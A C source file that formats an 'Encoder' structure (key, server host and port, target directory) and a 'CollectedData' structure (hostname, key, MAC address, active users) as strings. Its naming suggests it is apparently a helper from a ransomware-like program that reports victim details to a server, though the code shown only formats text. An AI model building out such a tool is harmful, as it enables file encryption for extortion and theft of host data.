#include "../include/encoder.h"
#include <stdio.h>
#include <string.h>

#define ENCODER_STRING_SIZE 1024
#define COLLECTED_DATA_STRING_SIZE 4096

#define ENCODER_STRING_TEMPLATE                                                \
	"Encoder {\n"                                                              \
	"\tKey: %s\n"                                                              \
	"\tServer Host: %s\n"                                                      \
	"\tServer Port: %s\n"                                                      \
	"\tTarget Directory: %s\n"                                                 \
	"}"

#define COLLECTED_DATA_STRING_TEMPLATE                                         \
	"CollectedData {\n"                                                        \
	"\tHostname: %s\n"                                                         \
	"\tKey: %s\n"                                                              \
	"\tMac Address: %s\n"                                                      \
	"\tActive User:\n%s\n"                                                     \
	"}"

char *encoder_to_string(const Encoder *encoder) {
	static char buffer[ENCODER_STRING_SIZE];
	snprintf(buffer, sizeof(buffer), ENCODER_STRING_TEMPLATE, encoder->key,
			 encoder->server_host, encoder->server_port,
			 encoder->target_directory);
	return buffer;
}

char *collected_data_to_string(const CollectedData *d) {
	static char buffer[COLLECTED_DATA_STRING_SIZE];
	char users_concat[MAX_ACTIVE_USERS_SIZE * ACTIVE_USER_SIZE] = {0};

	for (int i = 0; i < MAX_ACTIVE_USERS_SIZE; i++) {
		if (d->active_users[i][0] == '\0') break;
		strcat(users_concat, "\t- ");
		strcat(users_concat, d->active_users[i]);
		if (i + 1 < MAX_ACTIVE_USERS_SIZE && d->active_users[i + 1][0])
			strcat(users_concat, "\n");
	}

	snprintf(buffer, sizeof(buffer), COLLECTED_DATA_STRING_TEMPLATE,
			 d->hostname, d->key, d->mac_addres, users_concat);

	return buffer;
}
